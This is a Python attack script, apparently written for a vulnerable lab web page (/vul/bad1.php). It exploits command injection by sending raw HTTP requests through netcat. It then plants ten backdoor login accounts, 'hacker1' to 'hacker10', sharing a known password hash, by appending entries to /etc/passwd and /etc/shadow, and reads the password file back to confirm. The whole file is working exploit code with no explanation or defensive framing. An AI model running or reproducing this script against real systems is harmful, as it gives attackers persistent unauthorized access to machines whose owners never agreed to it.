#! /usr/bin/env python
import subprocess
import crypt

# Configuration
TARGET_IP   = "169.254.236.100"
TARGET_PORT = "80"
START_UID   = 5101

pw_hash = crypt.crypt("abc123", "$1$hacksalt1")

escaped_hash = pw_hash.replace("$", "\\$")

def send(cmd):
	payload = "-l;" + cmd
	
	def url_encode(s):
		safe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~:/"
		out = ""
		for ch in s:
			if ch in safe:
				out += ch
			else:
				out += "%" + ch.encode("hex") if hasattr(str, "decode") else "%" + format(ord(ch), "02X")
		return out

	try:
		import urllib
		encoded = urllib.quote(payload, safe="/:@$&'()*+,;=-._~")
	except AttributeError:
		import urllib.parse
		encoded = urllib.parse.quote(payload, safe="/:@$&'()*+,;=-._~")

	http_request = (
		"GET /vul/bad1.php?p=" + encoded + " HTTP/1.0\r\n"
		"Host: " + TARGET_IP + "\r\n"
		"\r\n"
	)

	proc = subprocess.Popen(
		["nc", TARGET_IP, TARGET_PORT],
		stdin=subprocess.PIPE, 
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	stdout, _ = proc.communicate(http_request.encode())
	return stdout.decode("utf-8", "replace")


# Create 10 accounts
for i in range(1, 11):
	username = "hacker" + str(i)
	uid = START_UID + (i - 1)

	passwd_entry = "{u}:x:{id}:{id}::/home/{u}:/bin/bash".format(u=username, id=uid)
	cmd_passwd = "echo " + passwd_entry + " >> /etc/passwd"
	send(cmd_passwd)

	shadow_entry = "{u}:{h}:18000:0:99999:7:::".format(u=username, h=escaped_hash)
	cmd_shadow = "echo " + shadow_entry + " >> /etc/shadow"
	send(cmd_shadow)

	print("Created: " + username)

response = send("tail -12 /etc/passwd")
print(response)
